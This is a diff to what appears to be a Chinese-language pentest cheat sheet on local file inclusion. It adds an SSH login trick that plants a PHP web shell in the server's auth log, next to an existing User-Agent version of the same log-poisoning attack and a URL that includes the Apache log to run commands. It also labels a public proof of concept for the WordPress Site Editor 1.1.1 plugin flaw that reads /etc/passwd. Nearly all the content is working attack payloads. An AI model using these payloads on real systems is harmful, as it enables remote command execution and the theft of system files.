@@ -92,6 +92,9 @@ chmod 775 -R /proc/self/environ
 # 目前可以控制任意檔案瀏覽，那我可不可以控我瀏覽的檔案內容?
 # 答案是可以的可以控制Access中的User-Agent
 User-Agent:<?php system($_GET [cmd]);?>
+# 或者這樣
+ssh '<?php system($_GET [cmd]);?>'@172.25.20.6
+
 # http://192.168.0.10/inc.php?file =/var/log/apache2/access.log&cmd=ls
 
 
@@ -194,6 +197,8 @@ https://www.exploit-db.com/exploits/44340
 ```
 POC
 ```bash
+# Plugin Site Editor 1.1.1 - LFI
+
 http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
 ```
 WPscan tool
